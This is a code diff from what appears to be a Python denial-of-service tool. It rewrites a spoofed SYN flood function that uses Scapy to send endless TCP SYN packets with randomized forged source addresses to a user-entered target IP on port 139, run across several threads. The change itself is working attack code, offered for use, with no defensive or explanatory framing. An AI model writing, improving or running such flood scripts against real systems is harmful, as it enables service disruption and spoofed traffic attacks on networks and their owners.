@@ -121,15 +121,20 @@ def syn_flood():
     t4.start()
 
 def spoofed_syn_flood():
-
     print("Insert target IP address: ")
     target = input()
     print("Attacking " + target + " with SPOOFED SYN flood.")
 
     def spoofed_flood():
-        packet = IP(src="192.168.222." + str(random.randint(2, 253)), dst=target) / \
-            TCP(dport=139, flags="S") / ("payloadpayloadpayload")
-        send(packet, inter=0.000001, loop=1)
+            while True:
+                send(IP(src="192.168.222." + str(random.randint(2, 253)), dst=target) / TCP(dport=139, flags="S") / "payloadpayloadpayload", inter=0.000001, loop=1, count=25)
+
+    try:
+        spoofed_flood()
+
+    except KeyboardInterrupt:
+        choose_dos()
+            
 
     t1 = threading.Thread(target=spoofed_flood())
     t2 = threading.Thread(target=spoofed_flood())
